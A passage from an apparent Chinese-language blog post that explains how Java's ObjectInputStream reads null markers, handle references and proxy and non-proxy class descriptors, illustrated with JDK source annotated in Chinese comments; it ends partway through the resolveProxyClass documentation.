<p>这里读取类描述信息的过程跟之前序列化过程相反，主要是根据序列化数据中的类描述信息创建一个 <code>ObjectStreamClass</code> 返回。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 读取并处理“空引用”标记，设置 passHandle 为 NULL_HANDLE 并返回 null。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Object <span class="title function_">readNull</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 期望并消费结构化标记 TC_NULL（0x70）</span></span><br><span class="line">    <span class="keyword">if</span> (bin.readByte() != TC_NULL) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InternalError</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 对应“无对象”——设置当前句柄为特殊的 NULL_HANDLE</span></span><br><span class="line">    passHandle = NULL_HANDLE;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 读取并处理“对象句柄引用”（TC_REFERENCE），把 passHandle 设为读到的句柄，</span></span><br><span class="line"><span class="comment"> * 并返回该句柄对应的对象实例。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 语义说明：</span></span><br><span class="line"><span class="comment"> * - 写端若多次写出同一对象，首次写“本体”，随后写“引用”：TC_REFERENCE + wireHandle。</span></span><br><span class="line"><span class="comment"> * - wireHandle = baseWireHandle(0x7E0000) + localIndex（本地句柄表下标）。</span></span><br><span class="line"><span class="comment"> * - 读端读到 TC_REFERENCE 后减去 base 得到本地句柄下标，到 handles 表中取对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 与 unshared 的关系：</span></span><br><span class="line"><span class="comment"> * - 当上层使用 readUnshared(...) 时，引用语义被禁止：</span></span><br><span class="line"><span class="comment"> *   * 若此处遇到 TC_REFERENCE，则直接抛 InvalidObjectException；</span></span><br><span class="line"><span class="comment"> *   * 若句柄指向的是“以非共享方式登记”的对象（unsharedMarker），也抛异常。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Object <span class="title function_">readHandle</span><span class="params">(<span class="type">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 期望并消费结构化标记 TC_REFERENCE（0x71）</span></span><br><span class="line">    <span class="keyword">if</span> (bin.readByte() != TC_REFERENCE) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InternalError</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取 4 字节 wire handle，并还原为本地句柄表下标：passHandle</span></span><br><span class="line">    passHandle = bin.readInt() - baseWireHandle;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 基本健全性检查：下标必须落在已分配范围内</span></span><br><span class="line">    <span class="keyword">if</span> (passHandle &lt; <span class="number">0</span> || passHandle &gt;= handles.size()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">            String.format(<span class="string">&quot;invalid handle value: %08X&quot;</span>, passHandle + baseWireHandle));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 非共享语义下不允许“读回引用”（别名共享被禁止）</span></span><br><span class="line">    <span class="keyword">if</span> (unshared) &#123;</span><br><span class="line">        <span class="comment">// 注：原实现里 REMIND 注释讨论异常类型，这里按 JDK 用法抛 InvalidObjectException</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;cannot read back reference as unshared&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查出该句柄所对应的对象</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> handles.lookupObject(passHandle);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若该句柄对应的是“非共享标记”（说明写端以 unshared 方式登记过该对象），</span></span><br><span class="line">    <span class="comment">// 则同样不允许通过引用读回（违背非共享语义）</span></span><br><span class="line">    <span class="keyword">if</span> (obj == unsharedMarker) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;cannot read back reference to unshared object&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 反序列化过滤器计数检查（不带具体类，仅校验引用计数/深度等配额）</span></span><br><span class="line">    filterCheck(<span class="literal">null</span>, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 读取并返回“动态代理类（Proxy）”的类描述符（ObjectStreamClass）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 语义要点：</span></span><br><span class="line"><span class="comment"> * - 流格式（与写端 writeProxyDesc 对称）：</span></span><br><span class="line"><span class="comment"> *   TC_PROXYCLASSDESC</span></span><br><span class="line"><span class="comment"> *   int interfaceCount</span></span><br><span class="line"><span class="comment"> *   UTF interfaceName[interfaceCount]</span></span><br><span class="line"><span class="comment"> *   classAnnotations (以 Block-Data 多段写入，随后 TC_ENDBLOCKDATA)</span></span><br><span class="line"><span class="comment"> *   superClassDesc</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * - 读取完成后：</span></span><br><span class="line"><span class="comment"> *   * 为该描述符分配的句柄会写入 handles，并把 passHandle 设为该句柄；</span></span><br><span class="line"><span class="comment"> *   * 若无法把接口列表解析成本地 VM 中的 Class（类/接口缺失），会把</span></span><br><span class="line"><span class="comment"> *     ClassNotFoundException 记录到该描述符句柄上（上层稍后会感知并抛出）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * - 反序列化过滤（JDK 9+）：对解析到的接口与代理类本身都会做 filterCheck，</span></span><br><span class="line"><span class="comment"> *   可用于阻断危险类型/过大结构。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> unshared  是否采用“非共享”语义（readUnshared 调用场景）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>          读取到的代理类描述符</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException              I/O 或协议错误</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> StreamCorruptedException 类型码不符合预期</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InvalidObjectException   接口数量异常等结构问题</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InvalidClassException    解析得到的 Class 不是代理类等</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> ObjectStreamClass <span class="title function_">readProxyDesc</span><span class="params">(<span class="type">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 1) 期望并消费“代理类描述符”标记</span></span><br><span class="line">    <span class="keyword">if</span> (bin.readByte() != TC_PROXYCLASSDESC) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InternalError</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 构建一个空的 OSC，并为其分配句柄（根据 unshared 决定是否可被回引）</span></span><br><span class="line">    <span class="type">ObjectStreamClass</span> <span class="variable">desc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectStreamClass</span>();</span><br><span class="line">    <span class="type">int</span> <span class="variable">descHandle</span> <span class="operator">=</span> handles.assign(unshared ? unsharedMarker : desc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在真正完成前，先把 passHandle 置为 NULL_HANDLE，避免“半成品”被外部误用</span></span><br><span class="line">    passHandle = NULL_HANDLE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 读取“接口列表”</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">numIfaces</span> <span class="operator">=</span> bin.readInt();</span><br><span class="line">    <span class="keyword">if</span> (numIfaces &gt; <span class="number">65535</span>) &#123; <span class="comment">// 保护性限制（协议/实现内的安全上限）</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;interface limit exceeded: &quot;</span> + numIfaces);</span><br><span class="line">    &#125;</span><br><span class="line">    String[] ifaces = <span class="keyword">new</span> <span class="title class_">String</span>[numIfaces];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; numIfaces; i++) &#123;</span><br><span class="line">        ifaces[i] = bin.readUTF(); <span class="comment">// 每个接口的全限定名</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) 解析为本地 Class（可能失败）</span></span><br><span class="line">    Class&lt;?&gt; cl = <span class="literal">null</span>;</span><br><span class="line">    <span class="type">ClassNotFoundException</span> <span class="variable">resolveEx</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 切到“块数据模式”，为稍后读取/跳过注解块（classAnnotations）做准备</span></span><br><span class="line">    bin.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 尝试把接口名数组解析成一个代理类（由 resolveProxyClass 钩子决定如何加载）</span></span><br><span class="line">        <span class="keyword">if</span> ((cl = resolveProxyClass(ifaces)) == <span class="literal">null</span>) &#123;</span><br><span class="line">            resolveEx = <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;null class&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!Proxy.isProxyClass(cl)) &#123;</span><br><span class="line">            <span class="comment">// 解析回来的并非真正的代理类</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Not a proxy&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 包访问检查：防止自定义子类借此越权访问受限包下的类型</span></span><br><span class="line">            ReflectUtil.checkProxyPackageAccess(getClass().getClassLoader(), cl.getInterfaces());</span><br><span class="line">            <span class="comment">// 对每个接口做反序列化过滤器检查（可按策略拒绝）</span></span><br><span class="line">            <span class="keyword">for</span> (Class&lt;?&gt; itf : cl.getInterfaces()) &#123;</span><br><span class="line">                filterCheck(itf, -<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        <span class="comment">// 记录“无法解析类”的异常，稍后绑定到描述符句柄</span></span><br><span class="line">        resolveEx = ex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在读取更多内容前，先对“解析到的代理类本身”做一次过滤检查（早失败）</span></span><br><span class="line">    filterCheck(cl, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5) 跳过“类注解块”（classAnnotations）：</span></span><br><span class="line">    <span class="comment">//    - 写端可能写了若干 TC_BLOCKDATA / TC_BLOCKDATALONG；必须读到 TC_ENDBLOCKDATA</span></span><br><span class="line">    <span class="comment">//    - skipCustomData() 内部会消费这些块，并在结尾切回“非块模式”</span></span><br><span class="line">    skipCustomData();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6) 读取“父类描述符”（superClassDesc），并初始化 OSC</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        totalObjectRefs++;   <span class="comment">// 统计（可被过滤器用于限额判断）</span></span><br><span class="line">        depth++;             <span class="comment">// 嵌套深度（控制回调/异常传播范围）</span></span><br><span class="line">        <span class="comment">// initProxy：把“解析到的 Class（或异常）”与“父类描述符”写入本 OSC</span></span><br><span class="line">        desc.initProxy(cl, resolveEx, readClassDesc(<span class="literal">false</span>));</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        depth--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7) 完成该描述符的构建，允许后续通过句柄回引</span></span><br><span class="line">    handles.finish(descHandle);</span><br><span class="line">    passHandle = descHandle;</span><br><span class="line">    <span class="keyword">return</span> desc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 读取并返回“普通类（非动态代理）”的类描述符（ObjectStreamClass）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 流格式（与写端 writeNonProxyDesc 对称）：</span></span><br><span class="line"><span class="comment"> *   TC_CLASSDESC</span></span><br><span class="line"><span class="comment"> *   classDescBody                  // 类名、SUID、flags、字段表（由 readClassDescriptor 读取）</span></span><br><span class="line"><span class="comment"> *   classAnnotations (Block-Data)  // 可选注解块，随后 TC_ENDBLOCKDATA</span></span><br><span class="line"><span class="comment"> *   superClassDesc                 // 父类的类描述符（递归；到 Object 为 TC_NULL）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 读取完成后：</span></span><br><span class="line"><span class="comment"> * - 为该描述符分配的句柄记录在 handles，并将 passHandle 设为该句柄；</span></span><br><span class="line"><span class="comment"> * - 若不能将该描述符解析为本地 JVM 中的 Class，则把 ClassNotFoundException</span></span><br><span class="line"><span class="comment"> *   绑定到该描述符句柄（上层稍后会感知并抛出）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> unshared 是否采用“非共享”语义（readUnshared 场景）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 读取到的 ObjectStreamClass</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException               I/O 或协议错误</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> StreamCorruptedException  类型码非法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InvalidClassException     读取类描述符体失败等</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> ObjectStreamClass <span class="title function_">readNonProxyDesc</span><span class="params">(<span class="type">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 1) 期望并消费“普通类描述符”标记</span></span><br><span class="line">    <span class="keyword">if</span> (bin.readByte() != TC_CLASSDESC) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InternalError</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 创建空的 OSC，并分配句柄（unshared 时登记特殊标记以禁止后续回引）</span></span><br><span class="line">    <span class="type">ObjectStreamClass</span> <span class="variable">desc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectStreamClass</span>();</span><br><span class="line">    <span class="type">int</span> <span class="variable">descHandle</span> <span class="operator">=</span> handles.assign(unshared ? unsharedMarker : desc);</span><br><span class="line">    <span class="comment">// 在真正完成前，passHandle 暂置为空，避免“半成品”被使用</span></span><br><span class="line">    passHandle = NULL_HANDLE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 读取“类描述符主体”（classDescBody）</span></span><br><span class="line">    <span class="comment">//    - 等价于写端的 writeClassDescriptor(desc)</span></span><br><span class="line">    <span class="comment">//    - 包括：类名、serialVersionUID、flags、字段表等</span></span><br><span class="line">    <span class="type">ObjectStreamClass</span> <span class="variable">readDesc</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        readDesc = readClassDescriptor();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        <span class="comment">// 读取“主体”阶段就需要加载某些类型签名，失败则包装为 InvalidClassException</span></span><br><span class="line">        <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">            <span class="string">&quot;failed to read class descriptor&quot;</span>).initCause(ex);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) 尝试把描述符解析为本地 Class，并做包访问校验</span></span><br><span class="line">    Class&lt;?&gt; cl = <span class="literal">null</span>;</span><br><span class="line">    <span class="type">ClassNotFoundException</span> <span class="variable">resolveEx</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 切到块数据模式，准备读取/跳过“类注解块”（classAnnotations）</span></span><br><span class="line">    bin.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">checksRequired</span> <span class="operator">=</span> isCustomSubclass(); <span class="comment">// 自定义子类需做额外的包访问检查</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// resolveClass：把 readDesc 指向的类名解析为本地 Class（可被子类覆盖）</span></span><br><span class="line">        <span class="keyword">if</span> ((cl = resolveClass(readDesc)) == <span class="literal">null</span>) &#123;</span><br><span class="line">            resolveEx = <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;null class&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (checksRequired) &#123;</span><br><span class="line">            <span class="comment">// 安全：自定义子类时校验包访问权限，避免越权加载敏感包</span></span><br><span class="line">            ReflectUtil.checkPackageAccess(cl);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        resolveEx = ex; <span class="comment">// 暂存，稍后绑定到描述符句柄</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在读取更多内容之前，先对解析到的类本身做一次过滤器检查（JDK9+）</span></span><br><span class="line">    <span class="comment">// 可按策略拒绝危险类型/过大结构（数组长度等此处无，传 -1）</span></span><br><span class="line">    filterCheck(cl, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5) 跳过“类注解块”（classAnnotations）直到 TC_ENDBLOCKDATA：</span></span><br><span class="line">    <span class="comment">//    - 写端可能写了若干 TC_BLOCKDATA/TC_BLOCKDATALONG；</span></span><br><span class="line">    <span class="comment">//    - 这里负责全部吞掉，并在结束后切回非块模式</span></span><br><span class="line">    skipCustomData();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6) 读取“父类描述符”，并初始化 OSC</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        totalObjectRefs++; <span class="comment">// 统计（供过滤器限额评估）</span></span><br><span class="line">        depth++;           <span class="comment">// 嵌套深度（控制回调/异常传播范围）</span></span><br><span class="line">        <span class="comment">// initNonProxy：将“读取到的主体信息 + 解析到的 Class（或异常） +</span></span><br><span class="line">        <span class="comment">//               父类描述符”组合进当前描述符</span></span><br><span class="line">        desc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(<span class="literal">false</span>));</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        depth--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7) 标记该描述符构建完成，允许后续通过句柄回引；设置 passHandle 并返回</span></span><br><span class="line">    handles.finish(descHandle);</span><br><span class="line">    passHandle = descHandle;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> desc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在读取类信息的时候顺带还会尝试从本地加载对应的类。</p>
<p>对于代理类，会根据该代理类实现所有的接口调用 <code>java.lang.reflect.Proxy#getProxyClass</code> 创建对应的类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将代理类描述符里给出的接口名数组解析为“本地 JVM 的代理类 Class”。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;可被子类覆盖：子类既可以在读取代理类描述符（接口名列表、注解块等）时</span></span><br><span class="line"><span class="comment"> * 额外读取自定义数据，也可以在这里通过自定义的类加载机制加载接口和生成代理类。</span></span><br><span class="line"><span class="comment"> * 与输出端的 &#123;<span class="doctag">@link</span> ObjectOutputStream#annotateProxyClass(Class)&#125; 相对应。</span></span><br><span class="line"><span class="comment"> * &lt;b&gt;同一个代理类描述符在一次反序列化过程中只会调用一次本方法。&lt;/b&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;默认实现逻辑（与 &#123;<span class="doctag">@link</span> #resolveClass(ObjectStreamClass)&#125; 类似）：</span></span><br><span class="line"><span class="comment"> * &lt;ol&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;选择类加载器：取调用栈上“最近的一个由用户自定义类加载器定义的类”的那个</span></span><br><span class="line"><span class="comment"> *       ClassLoader 作为 &lt;code&gt;latestLoader&lt;/code&gt;；若没有，使用 &lt;code&gt;null&lt;/code&gt;</span></span><br><span class="line"><span class="comment"> *      （表示引导/系统默认加载路径）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;对每个接口名 &lt;code&gt;i&lt;/code&gt; 执行</span></span><br><span class="line"><span class="comment"> *       &lt;pre&gt;Class.forName(i, false, latestLoader)&lt;/pre&gt;</span></span><br><span class="line"><span class="comment"> *       得到接口的 Class 对象；若某接口是&lt;b&gt;非 public&lt;/b&gt;，记录其类加载器为</span></span><br><span class="line"><span class="comment"> *       &lt;code&gt;nonPublicLoader&lt;/code&gt;，并要求所有非 public 接口的类加载器必须一致，</span></span><br><span class="line"><span class="comment"> *       否则抛出 &#123;<span class="doctag">@link</span> IllegalAccessError&#125;（JDK 对代理类的封装性约束）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   